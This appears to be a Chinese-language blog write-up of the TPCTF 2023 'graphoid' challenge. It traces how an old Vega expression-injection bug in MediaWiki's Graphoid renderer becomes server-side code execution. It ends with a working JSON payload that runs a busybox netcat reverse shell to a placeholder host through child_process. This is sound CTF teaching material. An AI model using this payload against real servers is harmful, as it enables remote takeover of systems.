---
title: TPCTF 2023 graphoid writeup
date: 2023-11-27 10:29:48
categories:
- CTF
tags:
- nodejs
- vega


toc: true
---

这个题的思路并不是很明确，给出了一个 MediaWiki 已经废弃的项目：
- [Extension:Graph/Graphoid - MediaWiki](https://m.mediawiki.org/wiki/Extension:Graph/Graphoid)

Graphoid 用于对用户提供的输入图像定义文件进行渲染，返回图像内容。

由于项目较老，可以考虑使用 dependency-check 先扫一遍历史漏洞。
```bash
dependency-check -s . -o report -f HTML
```
得到报告之后可以看出历史漏洞很多，但之后结合代码审计的结果看并没有什么用。

项目使用 nodejs 编写，项目需要看的 js 代码并不多：
```bash
└─$ tree  | grep js
├── app.js
│   ├── api-util.js
│   ├── swagger-ui.js
│   ├── util.js
│   ├── vega1.js
│   ├── vega2.js
│   └── vega.js
├── npm-shrinkwrap.json
├── package.json
│   ├── graphoid-v1.js
│   ├── graphoid-v2.js
│   ├── info.js
│   └── root.js
│   └── sqlToFiles.js
├── server.js
    │   │   ├── app.js
    │   │   └── spec.js
    │   │   └── info.js
    │       └── graph.js
    ├── index.js
        ├── assert.js
        ├── logStream.js
        └── server.js
```

主体功能及对应的文件如下：
1. 路由功能：
   1. graphoid-v1.js：v1 版本的接口
   2. graphoid-v2.js：v2 版本的接口
2. 渲染功能
   1. vega.js：根据输入的版本信息，决定调用 vega1.js 还是 vega2.js 进行渲染。
   2. vega1.js
   3. vega2.js
3. swagger 文档：访问 /?doc
4. 系统信息：访问 /?spec

主体代码似乎没什么洞，即使 graphoid-v1 中有一个 merge 操作，也并不能造成 prototype pollution。

代码中似乎对 underscore 也进行了调用，underscore 有一个代码执行漏洞：[Arbitrary Code Injection in org.webjars.npm:underscore - CVE-2021-23358 - Snyk](https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1081503)，但应该得结合原型链污染才行。

考虑到主体功能还是通过 vega 进行渲染，因此可以去 vega 的仓库看看 issue。找到了几个 xss。其中有一个比较有趣：
- https://github.com/vega/vega/issues/3018

这个 issue 的 payload 曾在 hxp2020 hackme 这道题中用于触发 XSS。

由于 Graphoid 中的 vega 比较老，应该是 3.2.1 版本，可以关注 vega2 的 payload：

![20231127212739](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231127212739.png)

这个 payload 在 https://vega.github.io/vega-editor/?mode=vega 中是可以正常触发 xss 的。

这个 payload 只能是 XSS 吗？Graphoid 中的 vaga 可是运行在服务端，既然该漏洞能够通过 eval 执行执行任意 JavaScript 代码，那就是 RCE 了。

测试这个 poc 后确实可以执行代码，稍作更改即可反弹 shell。（平台更新了一次附件，第一次的附件搭建出来的环境，png 接口也可以触发，且环境中有 curl 可以带出来。更新后的附件搭建出来的环境，png 接口总会报错，但 svg 接口可以正常触发，另外环境没有 curl 了，但是有 busybox 可以 nc 反弹 shell。

v2 接口发送如下的 payload。
```json
{
  "data": [
    {
      "name": "data",
      "values": [{}],
      "transform": [
        {"type": "filter", "test": "(0//1/)-'\\\n,console.log(process.mainModule.require(\"child_process\").execSync(\"busybox nc xxxx 9001 -e ash\")),console.log(222))))//'"}
      ]
    }
  ]
}
```






